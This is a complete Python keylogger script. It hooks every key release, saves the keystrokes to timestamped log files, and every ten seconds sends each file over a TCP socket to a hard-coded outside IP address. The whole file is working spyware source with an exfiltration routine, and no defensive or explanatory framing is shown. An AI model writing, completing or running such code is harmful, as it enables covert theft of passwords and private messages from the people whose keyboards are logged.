import keyboard
import socket
from datetime import datetime
from threading import Timer
import os

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        #self.filename = f"logs/keylog-{start_dt_str}_{end_dt_str}.txt"
        if not os.path.exists("logs"):
            os.mkdir("logs")
        self.filename = os.path.join(os.getcwd(), "logs", f"keylog-{start_dt_str}_{end_dt_str}.txt")
    
    def save_file(self):
        with open(self.filename, "w+") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}")
    
    def send_file(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('140.113.168.197', 12345))
        print('socket connected')

        with open(self.filename, 'rb') as f:
            s.send(b'BEGIN')
            while True:
                data = f.read(1024)
                if not data:
                    break
                s.send(data)
            f.close()
        s.send(b'END')
        print('file sent')

        s.close()
    
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.save_file()
            self.send_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    klg = Keylogger(interval=10)
    klg.start()        
